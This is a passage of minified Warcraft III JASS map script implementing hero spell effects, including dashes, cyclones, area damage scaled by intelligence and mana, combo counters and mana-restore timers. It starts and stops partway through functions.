call ForGroup(Mc,function pE)
call DestroyGroup(Mc)
call DestroyBoolExpr(Np)
set Mc=null
set Np=null
else
call ForGroup(V2[GetPlayerId(GetOwningPlayer(Pq))],function pD)
call DestroyGroup(V2[GetPlayerId(GetOwningPlayer(Pq))])
call RemoveUnit(Hu)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetUnitTypeId(Pq),10)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set No=null
endfunction
function pG takes nothing returns nothing
if IsUnitInGroup(GetEnumUnit(),V1[GetPlayerId(GetOwningPlayer(Pq))])==false then
call GroupAddUnit(V1[GetPlayerId(GetOwningPlayer(Pq))],GetEnumUnit())
call m2(GetEnumUnit(),Nu)
endif
endfunction
function pH takes nothing returns nothing
if IsUnitInGroup(GetEnumUnit(),UN[GetPlayerId(GetOwningPlayer(Pq))])==false then
call GroupAddUnit(UN[GetPlayerId(GetOwningPlayer(Pq))],GetEnumUnit())
call mz(Pq,GetEnumUnit(),Nu)
endif
endfunction
function pI takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),2)
local real Mc
local real No
local real Np
local real Nt
local real Ny
local real Ot
local real Ou
local location Ov
local string Ow
local group Ox
local boolexpr Oz
local real O0
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),1,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)>=1 then
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)<=450 then
set Mc=GetLocationX(LoadLocationHandle(Nq,GetHandleId(GetExpiredTimer()),3))
set No=GetLocationY(LoadLocationHandle(Nq,GetHandleId(GetExpiredTimer()),3))
set Np=GetUnitX(Hu)
set Nt=GetUnitY(Hu)
set Ny=Atan2(No-Nt,Mc-Np)
set Ot=nR(GetUnitX(Hu)+2*Cos(Ny))
set Ou=nS(GetUnitY(Hu)+2*Sin(Ny))
set Ov=Location(Ot,Ou)
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),0,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),0)+1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),0)==45 then
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),0,0)
set Ow=""
if GetUnitAbilityLevel(Hu,$4162756E)>=1 then
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Ow="war3mapImported\\IceSlam.mdx"
endif
call DestroyEffect(AddSpecialEffectLoc(Ow,Ov))
else
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Ow="Abilities\\Weapons\\FrostWyrmMissile\\FrostWyrmMissile.mdl"
endif
call DestroyEffect(AddSpecialEffectLoc(Ow,Ov))
endif
endif
if IsTerrainPathable(GetLocationX(Ov),GetLocationY(Ov),PATHING_TYPE_WALKABILITY)==false then
call SetUnitFacingTimed(Hu,nK(GetLocationX(LoadLocationHandle(Nq,GetHandleId(GetExpiredTimer()),3)),GetLocationY(LoadLocationHandle(Nq,GetHandleId(GetExpiredTimer()),3)),GetLocationX(Ov),GetLocationY(Ov)),0)
call SetUnitPositionLoc(Hu,Ov)
set Ox=CreateGroup()
set Oz=Condition(function mx)
call GroupEnumUnitsInRange(Ox,GetLocationX(Ov),GetLocationY(Ov),300,Oz)
set Pq=Hu
set O0=I2R(50*GetUnitAbilityLevel(Hu,$41313355)+GetHeroInt(Hu,true)*2)*N0[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(O0)
if GetUnitAbilityLevel(Hu,$4162756E)>=1 then
call nd(Ox,$4131324E,2,"creepthunderbolt")
set Nu=Nu*2
endif
call ForGroup(Ox,function pH)
call DestroyGroup(Ox)
call DestroyBoolExpr(Oz)
set Ox=null
set Oz=null
set Ox=CreateGroup()
set Oz=Condition(function mw)
call GroupEnumUnitsInRange(Ox,GetLocationX(Ov),GetLocationY(Ov),300,Oz)
set Pq=Hu
set O0=I2R(50*GetUnitAbilityLevel(Hu,$41313355)+GetHeroInt(Hu,true)*3/2)*TQ[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(O0)
call ForGroup(Ox,function pG)
call DestroyGroup(Ox)
call DestroyBoolExpr(Oz)
set Ox=null
set Oz=null
else
call DestroyGroup(V1[GetPlayerId(GetOwningPlayer(Hu))])
call PauseUnit(Hu,false)
call SetUnitInvulnerable(Hu,false)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$4131375A,true)
call UnitRemoveAbility(Hu,$4131375A)
call UnitRemoveAbility(Hu,$4230314D)
call RemoveLocation(LoadLocationHandle(Nq,GetHandleId(GetExpiredTimer()),3))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),3)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
call RemoveLocation(Ov)
set Ov=null
endif
else
call DestroyGroup(V1[GetPlayerId(GetOwningPlayer(Hu))])
call PauseUnit(Hu,false)
call SetUnitInvulnerable(Hu,false)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$4131375A,true)
call UnitRemoveAbility(Hu,$4131375A)
call UnitRemoveAbility(Hu,$4230314D)
call RemoveLocation(LoadLocationHandle(Nq,GetHandleId(GetExpiredTimer()),3))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),3)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function pJ takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),2)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),7)
local real Mc
local location No
local location Np
local group Nt
local boolexpr Ny
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),1,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)>=1 then
set Pq=MT[GetPlayerId(GetOwningPlayer(Hu))]
set Mc=I2R(20*GetUnitAbilityLevel(Pq,$41313353)+GetHeroInt(Pq,true)/4)*N0[GetPlayerId(GetOwningPlayer(Pq))+1]
set Nu=R2I(Mc)
set No=GetUnitLoc(NQ)
set Np=nU(No,17,GetUnitFacing(NQ))
call SetUnitPositionLoc(NQ,Np)
set Nt=CreateGroup()
set Ny=Condition(function mx)
call GroupEnumUnitsInRange(Nt,GetLocationX(No),GetLocationY(No),200,Ny)
call ForGroup(Nt,function pH)
call DestroyGroup(Nt)
call DestroyBoolExpr(Ny)
set Nt=null
set Ny=null
set Nt=null
set Nt=CreateGroup()
set Ny=Condition(function mw)
call GroupEnumUnitsInRange(Nt,GetLocationX(No),GetLocationY(No),200,Ny)
set Pq=MT[GetPlayerId(GetOwningPlayer(Hu))]
set Mc=I2R(20*GetUnitAbilityLevel(Pq,$41313353)+GetHeroInt(Pq,true)/4)*TQ[GetPlayerId(GetOwningPlayer(Pq))+1]
set Nu=R2I(Mc)
call ForGroup(Nt,function pG)
call DestroyGroup(Nt)
call DestroyBoolExpr(Ny)
set Nt=null
set Ny=null
call RemoveLocation(No)
call RemoveLocation(Np)
set No=null
set Np=null
else
call DestroyGroup(V1[GetPlayerId(GetOwningPlayer(Hu))])
call KillUnit(NQ)
call RemoveUnit(NQ)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),7)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set NQ=null
endfunction
function pK takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local location Mc
local unit No
local timer Np
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>=1 and GetUnitAbilityLevel(Hu,$4162756E)>=1 then
call SetUnitPositionLoc(Hu,LoadLocationHandle(Nq,GetHandleId(GetExpiredTimer()),1))
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),3,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),3)+1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),3)==15 then
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),3,0)
call GroupClear(UN[GetPlayerId(GetOwningPlayer(Hu))])
set Mc=GetUnitLoc(Hu)
set No=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303739,Mc,GetUnitFacing(Hu))
call SetUnitPathing(No,false)
call AddSpecialEffectTarget("war3mapImported\\WindMissle.mdx",No,"chest")
set Pq=MT[GetPlayerId(GetOwningPlayer(Hu))]
call GroupClear(UN[GetPlayerId(GetOwningPlayer(Pq))])
call DestroyGroup(V1[GetPlayerId(GetOwningPlayer(Pq))])
set V1[GetPlayerId(GetOwningPlayer(Pq))]=CreateGroup()
call GroupClear(V1[GetPlayerId(GetOwningPlayer(Pq))])
set Np=CreateTimer()
call SaveInteger(Nq,GetHandleId(Np),1,50)
call SaveUnitHandle(Nq,GetHandleId(Np),2,Hu)
call SaveUnitHandle(Nq,GetHandleId(Np),7,No)
call TimerStart(Np,.01,true,function pJ)
set Np=null
endif
else
call UnitRemoveAbility(Hu,$4162756E)
call UnitRemoveAbility(Hu,$41313354)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41313353,true)
call SetUnitTurnSpeed(Hu,.4)
call RemoveLocation(LoadLocationHandle(Nq,GetHandleId(GetExpiredTimer()),1))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set No=null
set Mc=null
endfunction
function pM takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
local location Ht=GetUnitLoc(Hu)
local location Nk
local group Na
local timer Hc
local boolexpr Nb
local unit NQ
local unit Nv=GetSpellTargetUnit()
local string Mc
if GetSpellAbilityId()==$41313351 then
set Na=CreateGroup()
set Nb=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),600,Nb)
call nd(Na,$41313352,1,"cyclone")
call DestroyBoolExpr(Nb)
call DestroyGroup(Na)
set Nb=null
set Na=null
set Na=CreateGroup()
set Nb=Condition(function mw)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),600,Nb)
call nd(Na,$41313352,1,"cyclone")
call DestroyBoolExpr(Nb)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Nb=null
set Na=null
if GetUnitAbilityLevel(Hu,$41313442)>=1 then
set Nz[Ma]=Nz[Ma]+1
if Nz[Ma]==3 then
call ne(Hu,"|c006969ff"+I2S(Nz[Ma])+"!!!",.043,255,255,255)
set Nz[Ma]=0
call UnitRemoveAbility(Hu,$41313351)
call UnitAddAbility(Hu,$41313351)
else
call ne(Hu,"|c006969ff"+I2S(Nz[Ma]),.033,255,255,255)
endif
endif
elseif GetSpellAbilityId()==$41313353 then
set NQ=GetTriggerUnit()
if GetUnitAbilityLevel(Hu,$41313442)>=1 then
set Nz[Ma]=Nz[Ma]+1
if Nz[Ma]==3 then
call ne(Hu,"|c006969ff"+I2S(Nz[Ma])+"!!!",.043,255,255,255)
set Nz[Ma]=0
set NQ=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303739,Ht,GetUnitFacing(Hu))
call SetUnitPathing(NQ,false)
call AddSpecialEffectTarget("war3mapImported\\jingzi_fenghuang01.mdx",NQ,"overhead")
call nD(NQ,13)
else
call ne(Hu,"|c006969ff"+I2S(Nz[Ma]),.033,255,255,255)
set NQ=GetTriggerUnit()
endif
endif
call UnitAddAbility(NQ,$4162756E)
call UnitAddAbility(NQ,$41313354)
call SetPlayerAbilityAvailable(GetOwningPlayer(NQ),$41313353,false)
call SetPlayerAbilityAvailable(GetOwningPlayer(NQ),$41313354,true)
call SetUnitTurnSpeed(NQ,3)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,NQ)
call SaveLocationHandle(Nq,GetHandleId(Hc),1,Ht)
call SaveInteger(Nq,GetHandleId(Hc),2,251)
call SaveInteger(Nq,GetHandleId(Hc),3,0)
call TimerStart(Hc,.05,true,function pK)
set Hc=null
elseif GetSpellAbilityId()==$41313354 then
call UnitRemoveAbility(Hu,$4162756E)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41313353,true)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41313354,false)
elseif GetSpellAbilityId()==$41313355 then
call UnitAddAbility(Hu,$4131375A)
set Nk=GetSpellTargetLoc()
call IssueImmediateOrder(Hu,"windwalk")
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$4131375A,false)
if GetUnitAbilityLevel(Hu,$41313442)>=1 then
set Nz[Ma]=Nz[Ma]+1
if Nz[Ma]==3 then
call ne(Hu,"|c006969ff"+I2S(Nz[Ma])+"!!!",.043,255,255,255)
set Nz[Ma]=0
else
call ne(Hu,"|c006969ff"+I2S(Nz[Ma]),.033,255,255,255)
endif
endif
call PauseUnit(Hu,true)
call SetUnitInvulnerable(Hu,true)
set Ht=GetUnitLoc(Hu)
call GroupClear(UN[GetPlayerId(GetOwningPlayer(Hu))])
call DestroyGroup(V1[GetPlayerId(GetOwningPlayer(Hu))])
set V1[GetPlayerId(GetOwningPlayer(Hu))]=CreateGroup()
call GroupClear(V1[GetPlayerId(GetOwningPlayer(Hu))])
set Hc=CreateTimer()
call SaveInteger(Nq,GetHandleId(Hc),1,550)
call SaveInteger(Nq,GetHandleId(Hc),0,0)
call SaveUnitHandle(Nq,GetHandleId(Hc),2,Hu)
call SaveLocationHandle(Nq,GetHandleId(Hc),3,Nk)
call TimerStart(Hc,.0017,true,function pI)
if GetUnitAbilityLevel(Hu,$41303853)>=1 then
set Ma=GetUnitAbilityLevel(Hu,$41313353)
call UnitRemoveAbility(Hu,$41313353)
call UnitAddAbility(Hu,$41313353)
call SetUnitAbilityLevel(Hu,$41313353,Ma)
endif
elseif GetSpellAbilityId()==$4131335A then
if GetUnitAbilityLevel(Hu,$41313442)>=1 then
set Nz[Ma]=Nz[Ma]+1
if Nz[Ma]==3 then
call ne(Hu,"|c006969ff"+I2S(Nz[Ma])+"!!!",.043,255,255,255)
set Nz[Ma]=0
set Ma=71
else
call ne(Hu,"|c006969ff"+I2S(Nz[Ma]),.033,255,255,255)
set Ma=41
endif
else
set Ma=41
endif
call GroupClear(V2[GetPlayerId(GetOwningPlayer(Hu))])
call DestroyGroup(V2[GetPlayerId(GetOwningPlayer(Hu))])
set V2[GetPlayerId(GetOwningPlayer(Hu))]=CreateGroup()
set Nk=GetSpellTargetLoc()
set NQ=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303739,Nk,GetUnitFacing(Hu))
call SetUnitPathing(NQ,false)
set Mc=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Mc="war3mapImported\\Fire Field Energy.mdx"
endif
call AddSpecialEffectTarget(Mc,NQ,"origin")
call SetUnitVertexColor(NQ,255,255,255,150)
call SetUnitScale(NQ,1.4,1.4,1.4)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,NQ)
call SaveUnitHandle(Nq,GetHandleId(Hc),2,Hu)
call SaveInteger(Nq,GetHandleId(Hc),1,Ma)
call TimerStart(Hc,.1,true,function pF)
set Hc=null
set NQ=null
elseif GetSpellAbilityId()==$41313430 then
set NQ=GetSpellTargetUnit()
call UnitAddAbility(NQ,$41304C59)
if GetUnitAbilityLevel(Hu,$41313442)>=1 then
set Nz[Ma]=Nz[Ma]+1
if Nz[Ma]==3 then
call ne(Hu,"|c006969ff"+I2S(Nz[Ma])+"!!!",.043,255,255,255)
set Nz[Ma]=0
call SetUnitAbilityLevel(NQ,$41304C59,2)
else
call ne(Hu,"|c006969ff"+I2S(Nz[Ma]),.033,255,255,255)
endif
endif
if GetUnitAbilityLevel(Hu,$41303853)>=1 then
set Ma=7
else
set Ma=5
endif
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,NQ)
call SaveInteger(Nq,GetHandleId(Hc),2,Ma)
call SaveEffectHandle(Nq,GetHandleId(Hc),3,AddSpecialEffectTarget("war3mapImported\\IceIncenerateBuff.mdx",NQ,"origin"))
call TimerStart(Hc,.5,true,function pC)
set Hc=null
elseif GetSpellAbilityId()==$41313435 then
set NQ=GetSpellTargetUnit()
call UnitAddAbility(NQ,$41305038)
call UnitAddAbility(NQ,$41313438)
call SetUnitAbilityLevel(NQ,$41313438,GetUnitAbilityLevel(Hu,$41313435))
call SetUnitAbilityLevel(NQ,$41305038,GetUnitAbilityLevel(Hu,$41313435))
if GetUnitAbilityLevel(Hu,$41303853)>=1 then
call SetUnitAbilityLevel(NQ,$41313438,11)
endif
if GetUnitAbilityLevel(Hu,$41313442)>=1 then
set Nz[Ma]=Nz[Ma]+1
if Nz[Ma]==3 then
call ne(Hu,"|c006969ff"+I2S(Nz[Ma])+"!!!",.043,255,255,255)
set Nz[Ma]=0
set Ma=11
call UnitRemoveAbility(NQ,$41313438)
else
call ne(Hu,"|c006969ff"+I2S(Nz[Ma]),.033,255,255,255)
set Ma=7
endif
else
set Ma=7
endif
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,NQ)
call SaveEffectHandle(Nq,GetHandleId(Hc),3,AddSpecialEffectTarget("war3mapImported\\Radiance Silver.mdl",NQ,"chest"))
call TimerStart(Hc,Ma,false,function pB)
set Hc=null
elseif GetSpellAbilityId()==$53303059 then
set NQ=GetSpellTargetUnit()
call SetUnitState(NQ,UNIT_STATE_LIFE,GetUnitState(NQ,UNIT_STATE_MAX_LIFE)*80*.01)
call SetUnitState(NQ,UNIT_STATE_MANA,GetUnitState(NQ,UNIT_STATE_MAX_MANA)*80*.01)
set Nk=GetUnitLoc(NQ)
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\BlizzardEruption.mdl",NQ,"chest"))
set Na=CreateGroup()
set Nb=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),1000,Nb)
call nd(Na,$4131324E,2,"creepthunderbolt")
call DestroyBoolExpr(Nb)
call DestroyGroup(Na)
set Nb=null
set Na=null
call RemoveLocation(Nk)
set Nk=null
endif
set Nv=null
set NQ=null
set Hc=null
set Nk=null
set Ht=null
set Hu=null
endfunction
function pN takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local location Mc
local location No
if GetUnitTypeId(Hu)==$4F303049 and GetUnitAbilityLevel(Hu,$4162756E)>=1 then
set Mc=GetUnitLoc(Hu)
set No=GetOrderPointLoc()
call SetUnitFacingTimed(Hu,nK(GetLocationX(Mc),GetLocationY(Mc),GetLocationX(No),GetLocationY(No)),0)
call RemoveLocation(Mc)
call RemoveLocation(No)
set Mc=null
set No=null
endif
set Hu=null
endfunction
function pO takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Hc,function pM)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_ISSUED_POINT_ORDER)
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddAction(Hc,function pN)
set Hc=null
endfunction
function pP takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local real Mc
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),5,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),5)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),5)>=1 then
set Mc=GetUnitState(Hu,UNIT_STATE_MANA)/10*N0[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(Mc)
call mz(Hu,NQ,Nu)
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MANA)+GetUnitState(Hu,UNIT_STATE_MAX_MANA)*.04)
call PauseUnit(NQ,true)
else
call PauseUnit(Hu,false)
call PauseUnit(NQ,false)
call SetUnitInvulnerable(Hu,false)
call KillUnit(GetSpellTargetUnit())
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),5)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set NQ=null
endfunction
function pQ takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local location Ht=GetUnitLoc(Hu)
local location Nk=GetUnitLoc(NQ)
local integer Mc
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),5,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),5)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),5)>=1 then
set Mc=0
call SetUnitState(Hu,UNIT_STATE_LIFE,LoadReal(Nq,GetHandleId(GetExpiredTimer()),2))
call SetUnitState(Hu,UNIT_STATE_MANA,LoadReal(Nq,GetHandleId(GetExpiredTimer()),3))
if nT(Ht,Nk)>=700 or not UnitAlive(Hu) or not UnitAlive(NQ) then
call UnitRemoveAbility(Hu,$41304C4E)
call UnitRemoveAbility(NQ,$41304C4E)
call DestroyEffect(LoadEffectHandle(Nq,GetHandleId(GetExpiredTimer()),6))
call DestroyEffect(LoadEffectHandle(Nq,GetHandleId(GetExpiredTimer()),7))
call DestroyLightning(LoadLightningHandle(Nq,GetHandleId(GetExpiredTimer()),4))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),4)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedReal(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedReal(Nq,GetHandleId(GetExpiredTimer()),3)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),5)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
if HaveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),4) then
call MoveLightning(LoadLightningHandle(Nq,GetHandleId(GetExpiredTimer()),4),true,GetLocationX(Ht),GetLocationY(Ht),GetLocationX(Nk),GetLocationY(Nk))
endif
else
call UnitRemoveAbility(Hu,$41304C4E)
call UnitRemoveAbility(NQ,$41304C4E)
call DestroyLightning(LoadLightningHandle(Nq,GetHandleId(GetExpiredTimer()),4))
call DestroyEffect(LoadEffectHandle(Nq,GetHandleId(GetExpiredTimer()),6))
call DestroyEffect(LoadEffectHandle(Nq,GetHandleId(GetExpiredTimer()),7))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),4)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedReal(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedReal(Nq,GetHandleId(GetExpiredTimer()),3)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),5)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
set Hu=null
set NQ=null
endfunction
function pR takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
local location Ht=GetUnitLoc(Hu)
local real NS
local group Na
local boolexpr Nb
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\DarkLightningNova.mdx",Ht))
set NS=(GetUnitState(MT[Ma],UNIT_STATE_MANA)+I2R(GetHeroInt(MT[Ma],true)*3+GetUnitAbilityLevel(MT[Ma],$41313657)*500))*N0[GetPlayerId(GetOwningPlayer(MT[Ma]))+1]
set Na=CreateGroup()
set Nb=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),600,Nb)
set Pq=MT[Ma]
set Nu=R2I(NS)
call ForGroup(Na,function nB)
call nd(Na,$4131324E,1,"creepthunderbolt")
call DestroyBoolExpr(Nb)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Nb=null
set Na=null
call RemoveUnit(Hu)
set Hu=null
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function pS takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local integer L9
local texttag NX
if GetUnitAbilityLevel(Hu,$41305734)>=1 then
set L9=R2I(GetUnitState(Hu,UNIT_STATE_MAX_MANA)/5)
else
set L9=R2I(GetUnitState(Hu,UNIT_STATE_MAX_MANA)/4)
endif
set NX=CreateTextTag()
call SetTextTagText(NX,"+"+I2S(L9),.023)
call SetTextTagPos(NX,GetUnitX(Hu),GetUnitY(Hu),0)
call SetTextTagColor(NX,0,0,255,255)
call SetTextTagVelocity(NX,0,.03)
call SetTextTagVisibility(NX,GetLocalPlayer()==GetOwningPlayer(Hu))
call SetTextTagFadepoint(NX,1)
call SetTextTagLifespan(NX,2)
call SetTextTagPermanent(NX,false)
call SetTextTagSuspended(NX,false)
set NX=null
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MANA)+I2R(L9))
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Blink Teal Caster.mdx",Hu,"origin"))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
set Hu=null
endfunction
function pT takes nothing returns nothing
local unit Nv=GetEnumUnit()
if GetUnitAbilityLevel(Nv,$42303851)>=1 then
call mz(Pq,Nv,Nu*2)
else
call mz(Pq,Nv,Nu)
endif
set Nv=null
endfunction
function pU takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
local location Ht=GetUnitLoc(Hu)
local location Nk
local group Na
local timer Hc
local boolexpr Nb
local real NS
local unit NQ
local unit Nv=GetSpellTargetUnit()
if GetSpellAbilityId()==$41305732 then
set Nk=nU(Ht,250,GetUnitFacing(Hu))
set NS=(GetUnitState(Hu,UNIT_STATE_MANA)/2+I2R(GetUnitAbilityLevel(Hu,$41305732)*100))*N0[GetPlayerId(GetOwningPlayer(Hu))+1]
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MANA)-GetUnitState(Hu,UNIT_STATE_MAX_MANA)*.08)
set Na=CreateGroup()
set Nb=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Nk),GetLocationY(Nk),250,Nb)
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Culling Cleave Purple.mdx",Hu,"origin"))
set Pq=Hu
set Nu=R2I(NS)
call ForGroup(Na,function pT)
call nd(Na,$5330305A,1,"cripple")
call DestroyBoolExpr(Nb)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Nb=null
set Na=null
elseif GetSpellAbilityId()==$41305735 then
set Nk=nU(Ht,300,GetUnitFacing(Hu))
set NS=(GetUnitState(Hu,UNIT_STATE_MANA)+2000)*N0[GetPlayerId(GetOwningPlayer(Hu))+1]
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MANA)-GetUnitState(Hu,UNIT_STATE_MAX_MANA)*.05)
set Na=CreateGroup()
set Nb=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Nk),GetLocationY(Nk),300,Nb)
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Culling Cleave Purple.mdx",Hu,"origin"))
set Pq=Hu
set Nu=R2I(NS)
call ForGroup(Na,function pT)
call nd(Na,$5330305A,1,"cripple")
call DestroyBoolExpr(Nb)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Nb=null
set Na=null
elseif GetSpellAbilityId()==$41305734 or GetSpellAbilityId()==$41305746 then
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call TimerStart(Hc,7,false,function pS)
set Hc=null
elseif GetSpellAbilityId()==$4131364E then
set Nk=GetUnitLoc(Nv)
